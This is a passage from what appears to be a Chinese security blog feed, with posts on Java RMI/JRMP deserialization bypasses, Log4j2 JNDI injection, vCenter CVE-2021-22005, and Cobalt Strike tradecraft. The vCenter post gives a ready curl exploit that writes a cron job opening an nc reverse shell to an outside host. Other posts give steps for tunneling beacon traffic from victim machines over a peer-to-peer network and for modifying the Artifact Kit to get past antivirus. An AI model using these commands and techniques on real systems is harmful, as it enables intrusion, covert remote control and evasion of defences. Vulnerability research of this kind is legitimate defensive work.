title="攻击JRMP客户端"></a>攻击JRMP客户端</h2><p>RMI和DGC服务都是基于JRMP协议通信，就像HTTP应用与TCP之间会有Web服务器处理HTTP协议一样，JRMP也有相应的处理模块。我们将主动发起JRMP请求的一方称为JRMP客户端，将监听JRMP请求的一方成为JRMP服务端。</p><p>JEP290主要通过白名单限制了RMI服务端与DGC服务（注册端或服务端）readObject时能使用的类，却没有限制JRMP客户端处理JRMP服务端返回的异常信息readObject（<code>sun.rmi.transport.StreamRemoteCall#executeCall</code>）</p><p>同上文所述，JRMP服务端的<code>sun.rmi.transport.Transport#serviceCall</code>等位置都是直接<code>writeObject(Exception)</code>，所以需要实现恶意JRMP服务端在JRMP客户端发起连接时，将payload走异常接口给抛回去。</p><p><a href="https://github.com/frohoff/ysoserial/blob/8eb5cbfbf6c47a23682f6186bea9baf6439e57b9/src/main/java/ysoserial/exploit/JRMPListener.java#L244">ysoserial.exploit.JRMPListener</a>就是这种实现，构造为<code>[81, 2, payload]</code>的数据返回给JRMP客户端，使其进入异常处理触发payload。</p><h3 id="寻找Gadgets"><a href="#寻找Gadgets" class="headerlink" title="寻找Gadgets"></a>寻找Gadgets</h3><blockquote><p>DGCClient implements the client side of the RMI distributed garbage collection system. The external interface to DGCClient is the registerRefs() method. When a LiveRef to a remote object enters the JVM, it must be registered with the DGCClient to participate in distributed garbage collection. When the first LiveRef to a particular remote object is registered, a dirty() call is made to the server-side DGC for the remote object.</p></blockquote><p>可以知道当LiveRef加载进JVM后，会通过<code>registerRefs</code>注册并发起<code>dirty</code>请求。<a href="https://github.com/frohoff/ysoserial/blob/8eb5cbfbf6c47a23682f6186bea9baf6439e57b9/src/main/java/ysoserial/payloads/JRMPClient.java#L71">ysoserial.payloads.JRMPClient</a>以<code>sun.rmi.server.UnicastRef#readExternal</code>充当反序列化入口，在其中装填了<code>sun.rmi.transport.LiveRef</code>，借由DGC机制便可主动发起JRMP请求。</p><p>如果有地方能够触发这个反序列化入口，就可以让它成为JRMP客户端向恶意JRMP服务端发起请求，进而走没被限制的异常readObject触发最终payload。刚好<code>UnicastRef</code>是<code>RegistryImpl#registryFilter</code>的白名单类，原汤化原食了属于是。</p><h3 id="触发反序列化"><a href="#触发反序列化" class="headerlink" title="触发反序列化"></a>触发反序列化</h3><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java#L77">ysoserial.exploit.RMIRegistryExploit</a>利用的<code>registry.bind(name, remote)</code>在8u141后失效了，<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/exploits/rmi/RMIRegistryExploit.java#L76">ysomap.exploits.rmi.RMIRegistryExploit</a>使用的<code>Naming.lookup(registry, remote)</code>则依然有效。</p><p>同样要解决让第一步的payload符合类型要求的问题。要么依托原RMI客户端发起lookup，找一个实现了Remote且能存放LiveRef的类（比如<code>RemoteObjectInvocationHandler</code>），或者利用递归反序列化特性自己构造类；要么重新实现RMI客户端强行发送数据。</p><ul><li>前者找类并测试会遇到一个与类型相关很有意思的问题</li></ul><p><img src="/img/rmisum_f.png"></p><p><a href="https://github.com/openjdk/jdk/commit/55fc1fb794937091c11b40f674cc52b3560c3300">8u231</a>捕获了在加载Ref（第一步的payload）后会触发的异常，在发起JRMP请求（<code>releaseInputStream</code>）之前清除了Ref。</p><p><img src="/img/rmisum_g.png"></p><p>并且将dirty和clean中的<code>setObjectInputFilter(DGCImpl_Stub::leaseFilter)</code>过滤器提到了JRMP请求发起之后、恶意JRMP服务端最终gadgets触发之前（<code>ref.invoke(call)</code>)的位置。</p><p>细看可以发现缓解措施针对的都是加载Ref（第一步的payload）之后的过程，当有一个gadgets能在加载自身就触发JRMP请求，就能绕过这些过滤，An Trinhs找到了一条这样的链：</p><ol><li><p>UnicastRemoteObject#readObject</p></li><li><p>RMIServerSocketFactory#createServerSocket</p></li><li><p>RemoteObjectInvocationHandler#invoke</p></li></ol><p>利用动态代理机制封装了类，同时gank了本来的方法调用，将其引入invoke。</p><p><img src="/img/rmisum_h.png"></p><p>从OracleJDK-8u241/<a href="https://github.com/openjdk/jdk8u/commit/9fb68f29a5fc2bf5407e72f96ca6cd81be1af6e8#diff-9071564785e3fe39d109f0bb6b72a651">OpenJDK-8u242</a>开始将多处readObject再转型String的地方修改为了<code>SharedSecrets.getJavaObjectInputStreamReadString().readString</code>，修复了lookup时的反序列化入口，并且影响上文<strong>攻击远程方法参数</strong>和<strong>攻击RMI注册端</strong>中涉及String类型参数的地方。</p><h2 id="反制攻击方"><a href="#反制攻击方" class="headerlink" title="反制攻击方"></a>反制攻击方</h2><p>最后稍微聊一下喜闻乐见的反制问题，ysoserial在<a href="https://github.com/frohoff/ysoserial/commit/477ecb8f05f42b0195a67d9712e97f2c6d31e1da">477ecb8</a>更新了一个无限制的<code>registry.list()</code>，哪怕在8u261中依然是写着赤果果的readObject：</p><p><img src="/img/rmisum_i.png"></p><p>而在那个commit之前，也许作者是想借由原生的<code>registry.bind(name, remote)</code>得到注册端回显，方便攻击时判断gadgets环境，为此其戴了<code>ExecCheckingSecurityManage</code>作为安全措施（/doge），但还是可以通过CC链读写文件等方式间接溯源或者RCE。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/">Attacking Java RMI services after JEP 290</a></p><p><a href="https://xz.aliyun.com/t/7932">针对RMI服务的九重攻击 - 下</a></p><p><a href="https://openjdk.java.net/jeps/290">JEP 290: Filter Incoming Serialization Data</a></p><p><a href="https://www.ibm.com/docs/en/sdk-java-technology/8?topic=iiop-understanding-distributed-garbage-collection">Understanding distributed garbage collection</a></p><p><a href="https://www.bilibili.com/video/BV17Z4y1s7cG">30行代码透彻解析RPC</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可能师傅们也遇到过这种情况：因为问题A跟进某个类方法，调试期间遇到一个更纠结的问题B，在费尽周折终于搞清楚后，暮然回首却忘了自己在干什么（问题A）。。。QAQ&lt;/p&gt;
&lt;p&gt;JavaRMI与相关攻击面错综复杂，因此本文仅以时间线梳理各种绕过方法与缓解措施的主要逻辑，而不会详</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="RMI" scheme="https://hosch3n.github.io/tags/RMI/"/>
    
    <category term="DGC" scheme="https://hosch3n.github.io/tags/DGC/"/>
    
    <category term="JRMP" scheme="https://hosch3n.github.io/tags/JRMP/"/>
    
    <category term="useCodebaseOnly" scheme="https://hosch3n.github.io/tags/useCodebaseOnly/"/>
    
    <category term="registry" scheme="https://hosch3n.github.io/tags/registry/"/>
    
    <category term="BaRMIe" scheme="https://hosch3n.github.io/tags/BaRMIe/"/>
    
    <category term="ysoserial" scheme="https://hosch3n.github.io/tags/ysoserial/"/>
    
    <category term="ysomap" scheme="https://hosch3n.github.io/tags/ysomap/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2漏洞浅析</title>
    <link href="https://hosch3n.github.io/2021/12/10/Log4j2%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2021/12/10/Log4j2%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</id>
    <published>2021-12-09T23:03:24.000Z</published>
    <updated>2022-05-11T08:31:30.923Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Log4j是一个基于Java的日志框架，已于2015年8月5日停止维护。Log4j2是其重构升级版本，新增的<code>Lookups</code>方法设计用于通过多种途径动态引入外部变量。<code>log4j2版本 &lt; log4j-2.15.0-rc2</code>可由JNDI注入实现远程代码执行。</p><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><p>当POC作为message传递给<code>Logger</code>类的<code>error</code>、<code>fatal</code>等方法后，略去一些非关键流程，会进入到<code>MessagePatternConverter</code>类<code>format</code>方法对<code>$&#123;</code>内容进行解析替换：</p><p><img src="/img/log4j2_a.png"></p><p>之后进入<code>Interpolator</code>类的<code>lookup</code>方法，由前缀值<code>jndi</code>获取到<code>JndiLookup</code>类：</p><p><img src="/img/log4j2_b.png"></p><p>最终调用对应的<code>lookup</code>方法发起请求，也就是遍地开花的dnslog。。。</p><p><img src="/img/log4j2_c.png"></p><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><p>JDK版本&lt;8u191，可通过LDAP引入外部JNDI Reference：</p><p><img src="/img/log4j2_d.png"></p><p>JDK版本&gt;=8u191，当存在<code>org.apache.naming.factory.BeanFactory</code>与<code>com.springsource.org.apache.el</code>等依赖时，可在返回的JNDI Reference中指定相应工厂类及setter方法，或是由LDAP引入序列化链实现RCE：</p><p><img src="/img/log4j2_e.png"></p><p>同时可以结合一些其它<code>StrLookup</code>适当变形，以及配合官方测试用例中脏数据<code>&quot;?Type=A Type&amp;Name=1100110&amp;Char=!&quot;</code>绕过rc1。</p><p><img src="/img/log4j2_g.png"></p><p>RC2版本对此异常进行了捕获。。。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.docs4dev.com/docs/en/log4j2/2.x/all/manual-lookups.html">Log4j2 Manual Lookups</a></p><p><a href="https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3">LOG4J2-3201 - Limit the protocols JNDI can use by default</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Apache Log4j是一个基于Java的日志框架，已于2015年8月5日停止维护。Log4j2是其重构升级版本，新增的&lt;code&gt;Lookups&lt;/code&gt;方法设计用于通过多种途径动态引入外部变量。&lt;code&gt;log4j2版本 &amp;lt; log4j-2.15.0-rc</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="JNDI" scheme="https://hosch3n.github.io/tags/JNDI/"/>
    
    <category term="log4j" scheme="https://hosch3n.github.io/tags/log4j/"/>
    
    <category term="CVE-2021-44228" scheme="https://hosch3n.github.io/tags/CVE-2021-44228/"/>
    
  </entry>
  
  <entry>
    <title>去中心化上线CS</title>
    <link href="https://hosch3n.github.io/2021/11/10/%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E4%B8%8A%E7%BA%BFCS/"/>
    <id>https://hosch3n.github.io/2021/11/10/%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E4%B8%8A%E7%BA%BFCS/</id>
    <published>2021-11-10T09:21:19.000Z</published>
    <updated>2021-11-10T11:40:15.537Z</updated>
    
    <content type="html"><![CDATA[<p>当了回标题党（<del>下次还敢</del>），大佬们轻点打。<strong>仅供研究，不得用于任何非法目的</strong></p><h2 id="上线流程"><a href="#上线流程" class="headerlink" title="上线流程"></a>上线流程</h2><p>起初是看到了<a href="https://github.com/Maka8ka/NGLite">NGLite</a>这个远控工具，了解到NKN区块链网络。发现官方不但提供多语言SDK，连TCP隧道成品<a href="https://github.com/nknorg/nkn-tunnel">nkn-tunnel</a>都给了，果断嫖来搞歪门邪道。</p><ol><li>在本地正常流程启动CS，客户端连接本地服务器，按端口流量转发的套路新建监听器</li></ol><p><img src="/img/p2pcs_a.png"></p><ol start="2"><li>以下图CS4.4为例，木马之后会连接开在受害者本地p2p代理入口的8081端口，<code>172.16.1.1:443</code>为CS监听的本地内网地址与端口</li></ol><p><img src="/img/p2pcs_b.png"></p><ol start="3"><li><p>下载Releases中对应平台的成品，或者自行编译。本地执行<code>nkn-tunnel -from nkn -to 127.0.0.1:443 -v</code>，表示将NKN网络接收到的流量转发到本地443端口。此时会显示<code>Listening at xxx</code>，xxx是随机生成的64个十六进制数（secret seed）</p></li><li><p>在受害者机器上执行<code>nkn-tunnel -from 127.0.0.1:8081 to xxx</code>，表示将受害者本地8081端口接收到的流量转发进NKN网络</p></li><li><p>生成CS的stageless木马，在受害者机器上执行，免VPS上线</p></li></ol><p><img src="/img/p2pcs_c.png"></p><p>看客户案例国内移动和爱奇艺也在用这个网络，目前响应速度挺不错的，但是节点好像不多，抓人应该也不太难哈哈哈。后续可以与远控木马集成为单个二进制文件，也可以作为流量穿透方式的补充，或者被大家玩烂胎死腹中：(</p><p><img src="/img/p2pcs_d.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当了回标题党（&lt;del&gt;下次还敢&lt;/del&gt;），大佬们轻点打。&lt;strong&gt;仅供研究，不得用于任何非法目的&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;上线流程&quot;&gt;&lt;a href=&quot;#上线流程&quot; class=&quot;headerlink&quot; title=&quot;上线流程&quot;&gt;&lt;/a&gt;上线流</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="nkn" scheme="https://hosch3n.github.io/tags/nkn/"/>
    
    <category term="proxy" scheme="https://hosch3n.github.io/tags/proxy/"/>
    
    <category term="tunnel" scheme="https://hosch3n.github.io/tags/tunnel/"/>
    
  </entry>
  
  <entry>
    <title>Artifact集成Syscall与Detours</title>
    <link href="https://hosch3n.github.io/2021/11/02/Artifact%E9%9B%86%E6%88%90Syscall%E4%B8%8EDetours/"/>
    <id>https://hosch3n.github.io/2021/11/02/Artifact%E9%9B%86%E6%88%90Syscall%E4%B8%8EDetours/</id>
    <published>2021-11-02T09:13:35.000Z</published>
    <updated>2021-11-02T12:24:52.111Z</updated>
    
    <content type="html"><![CDATA[<p>Artifact是CS用来做免杀的Kit，可以让生成的PE文件自带免杀特效，相比生成shellcode由外部loader加载更方便。本质上可以理解为将自定义的外部loader集成进CS的接口。</p><ul><li>ArtifactKit并未开源，而且博客之前就被盯上封掉过。。。仅仅记录一下大致流程，具体实现可见参考链接，按照思路自行组装</li></ul><h2 id="修改模板"><a href="#修改模板" class="headerlink" title="修改模板"></a>修改模板</h2><p>以<code>dist-template</code>为例，将<code>patch.c</code>中用于填充定位的1024个A替换为其它字符串，同时替换<code>artifact.cna</code>中<code>indexOf</code>的相应字符串。</p><p>ArtifactKit原本采用4个随机数充当异或密钥，可以考虑实现高级加密算法，也可以只是方便的扩充<code>$key</code>数组的位数。相应地修改<code>artifact.cna</code>中<code>writeb</code>函数，以及<code>patch.c</code>中的异或取余位数、<code>patch.h</code>中结构体的key数组下标。</p><p>如果用mingw交叉编译，只需要去<code>build.sh</code>文件底部加上相应路径（注释掉官方本身自带的几个加快编译速度）。如果用VS编译，stage要在<code>patch.h</code>中加上<code>#define DATA_SIZE 1024</code>或<code>#define DATA_SIZE 271360</code>（big），<code>patch.c</code>中<code>set_key_pointers</code>函数的形式参数改为<code>char * buffer</code>。</p><h2 id="集成Syscall"><a href="#集成Syscall" class="headerlink" title="集成Syscall"></a>集成Syscall</h2><p>在定义功能函数的<code>patch.c</code>中引入<a href="https://github.com/jthuraisamy/Syswhispers2">SysWhispers2</a>与<a href="https://github.com/mai1zhi2/SysWhispers2_x86">SysWhispers2_x86</a>作为64位与32位Syscall函数实现，并将<code>VirtualAlloc</code>、<code>VirtualProtect</code>、<code>CreateThread</code>分别改写为<code>NtAllocateVirtualMemory</code>、<code>NtProtectVirtualMemory</code>、<code>NtCreateThreadEx</code>。</p><ul><li>VS编译时，64位项目<code>patch.c</code>中<code>spawn</code>函数的形式参数改为<code>__int64 length</code></li></ul><p>这样就已经可以过掉不少常见杀软了：</p><p><img src="/img/kitdschook_a.png"></p><p><img src="/img/kitdschook_b.png"></p><h2 id="集成Detours"><a href="#集成Detours" class="headerlink" title="集成Detours"></a>集成Detours</h2><p>与WBG大佬介绍的思路一样，hook相关系统函数，去除sleep期间beacon内存的EXECUTE权限，利用VEH处理sleep后执行时的<code>Access Violation</code>错误，只在执行期间短暂恢复权限。</p><p>可以进一步完善profile支持的<code>HeapAlloc</code>与<code>MapViewOfFile</code>内存申请方式、将被hook函数改为Syscall、适配stage类型调用。这个过程坑相当多，等有生之年完全吃透了再详细记录。（感谢NoOne大哥的全程指导）</p><p>最终绕过卡巴斯基终端安全：</p><p><img src="/img/kitdschook_c.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://br-sn.github.io/Implementing-Syscalls-In-The-CobaltStrike-Artifact-Kit/">Implementing Syscalls In The Cobaltstrike Artifact Kit</a></p><p><a href="https://xz.aliyun.com/t/9224">记一次cs bypass卡巴斯基内存查杀</a></p><p><a href="https://xz.aliyun.com/t/9399">cs bypass卡巴斯基内存查杀 2</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Artifact是CS用来做免杀的Kit，可以让生成的PE文件自带免杀特效，相比生成shellcode由外部loader加载更方便。本质上可以理解为将自定义的外部loader集成进CS的接口。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ArtifactKit并未开源，而且博客之前就被盯上封</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="artifact" scheme="https://hosch3n.github.io/tags/artifact/"/>
    
    <category term="syscall" scheme="https://hosch3n.github.io/tags/syscall/"/>
    
    <category term="detours" scheme="https://hosch3n.github.io/tags/detours/"/>
    
    <category term="hook" scheme="https://hosch3n.github.io/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>VMware vCenter漏洞分析（二）</title>
    <link href="https://hosch3n.github.io/2021/10/08/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2021/10/08/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-10-08T15:35:58.000Z</published>
    <updated>2022-05-11T08:06:19.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2021-22005"><a href="#CVE-2021-22005" class="headerlink" title="CVE-2021-22005"></a>CVE-2021-22005</h2><p>Analytics服务相关端点存在目录穿越写文件，可将</p><p>影响版本：</p><ul><li>7.0 &lt;= vCenter Server &lt; 7.0 U2c</li><li>6.7 &lt;= vCenter Server &lt; 6.7 U3o</li></ul><p>利用链1：<code>curl -k -X POST &#39;https://1.1.1.1/analytics/telemetry/ph/api/hyper/send?_c=&amp;_i=/../../../../../../etc/cron.d/syslog&#39; -d &#39;* * * * * root nc -e /bin/sh 2.2.2.2 1337&#39; -H &#39;Content-Type: application/json&#39;</code></p><p>利用链2：<a href="https://gist.github.com/testanull/5bb925179c4695e51ca400b7370bc252">asdklajsdlkajsdlkajsdakjsdhalskdasdioasiodaklsd.py</a></p><h3 id="AsyncTelemetryController漏洞分析"><a href="#AsyncTelemetryController漏洞分析" class="headerlink" title="AsyncTelemetryController漏洞分析"></a>AsyncTelemetryController漏洞分析</h3><p>vCenter在9月更新修复了一堆漏洞，由官方发布的<a href="https://kb.vmware.com/s/article/85717">CVE-2021-22005缓解措施</a>可以知道漏洞所在服务与Web路径：</p><p><img src="/img/vcenterldfxb_a.png"></p><p>对应路径的rhttpproxy策略在vCenter各版本中也不尽相同：</p><p><img src="/img/vcenterldfxb_b.png"></p><p>下载漏洞修复前后的两个补丁（VMware-vCenter-Server-Appliance-6.7.0.48000-18010531-patch-FP.iso、VMware-vCenter-Server-Appliance-6.7.0.50000-18485166-patch-FP.iso）并解压VMware-analytics的rpm包，反编译对比相关jar包：</p><p><img src="/img/vcenterldfxb_c.png"></p><p>对<code>/ph/api/hyper/send</code>路径的<code>_v</code>、<code>_c</code>、<code>_i</code>请求参数分别绑定给<code>version</code>、<code>collectorId</code>、<code>collectorInstanceId</code>变量，随后调用存在补丁变动的<code>handleSendRequest</code>方法，添加了对传入变量的白名单校验。<code>AsyncTelemetryController</code>类的另一处补丁变动类似，在<code>handleGetLevelRequest</code>方法添加了白名单校验。</p><p><img src="/img/vcenterldfxb_d.png"></p><p>跟进<code>TelemetryService</code>接口相应的具体实现，之前组装好的<code>TelemetryRequest</code>对象被加入了线程池异步调用。在<code>/etc/vmware-analytics/ph-telemetry-prod.xml</code>找到bean相关类。</p><p><img src="/img/vcenterldfxb_e.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phProdTelemetryService&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.internal.impl.AsyncTelemetryServiceWrapper&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">destroy-method</span>=<span class="string">&quot;close&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.TelemetryLevelBasedTelemetryServiceWrapper&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phProdLogTelemetryService&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phProdCeipTelemetryLevelService&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phProdLogTelemetryService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.LogTelemetryService&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetObject&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phLogTelemetryBaseDir&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetMethod&quot;</span> <span class="attr">value</span>=<span class="string">&quot;resolve&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;arguments&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;ph.telemetry.logdir.prod&#125;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phLog4j2Context&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phProdCeipTelemetryLevelService&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.push.telemetry.DefaultTelemetryLevelService&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phCeipConfigProvider&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.common.internal.manifest.PropertyControlledManifestContentProviderWrapper&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;phConfigurationService&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;phservices.manifest_location&quot;</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.vmware.ph.phservice.common.ph.PhManifestContentProvider&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">&quot;phProdTelemetryLevelServicePhClientFactory&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;ph.telemetry.level.cache.expiration_interval.millis&#125;&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;3&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;ph.telemetry.level.cache_size&#125;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>动态调试套路与之前一样，配置文件在<code>/etc/vmware/vmware-vmon/svcCfgfiles/analytics.json</code>，改完重启服务<code>service-control --restart vmware-analytics</code></li></ul><p><code>TelemetryLevelBasedTelemetryServiceWrapper</code>类<code>processTelemetry</code>方法会调用<code>DefaultTelemetryLevelService</code>类<code>getTelemetryLevel</code>方法获取<code>telemetryLevel</code>。</p><p><img src="/img/vcenterldfxb_f.png"></p><p>继续跟进看到需要<code>isCeipEnabled</code>不为默认值<code>false</code>才会继续流程：</p><p><img src="/img/vcenterldfxb_g.png"></p><p>随后调用<code>LogTelemetryService</code>类<code>processTelemetry</code>方法，利用log4j写日志文件至<code>/var/log/vmware/analytics/prod/</code>目录，文件内容为POST请求体数据。</p><p><img src="/img/vcenterldfxb_h.png"></p><p>很自然地想到之前21972目录穿越写文件，不同的是此时存在json后缀名，不能直接写WebShell；也要注意到我们此时是root而非vsphere-ui用户，可以写计划任务。但是构造<code>/../</code>后<code>_c_i</code>目录不存在，导致目录穿越报错：</p><p><img src="/img/vcenterldfxb_i.png"></p><p>可以先发送<code>_i=/any</code>，利用<code>createManager</code>方法的<code>FileUtils.makeParentDirs</code>将<code>_c_i</code>目录创建出来，随后再由目录穿越写计划任务反弹shell。</p><p><img src="/img/vcenterldfxb_j.png"></p><h3 id="DataAppAgentController漏洞分析"><a href="#DataAppAgentController漏洞分析" class="headerlink" title="DataAppAgentController漏洞分析"></a>DataAppAgentController漏洞分析</h3><p>对比官方验证脚本的另一处路径对应jar包，<code>/dataapp/agent</code>路径的<code>action=collect</code>相关代码被整段移除：</p><p><img src="/img/vcenterldfxb_k.png"></p><p>跟进<code>collect</code>方法后经历了各种类方法跳转，将POST请求体中JSON的<code>manifestContent</code>参数值解析后，作为<code>VelocityHelper.executeVelocityExpression</code>方法的入参<code>this._mappingCode</code>。</p><p><img src="/img/vcenterldfxb_l.png"></p><p>接着带入<code>VelocityEngine</code>类<code>evaluate</code>方法作为模板语句动态执行：</p><p><img src="/img/vcenterldfxb_m.png"></p><ul><li>不同版本的Velocity方法名略有不同</li></ul><p>最终 @testbnull 发现可以通过上下文可用的<code>$GLOBAL-logger</code>，利用<code>setFile</code>方法临时修改日志路径到Web路径的方式，写入WebShell实现RCE。</p><p><img src="/img/vcenterldfxb_n.png"></p><p><img 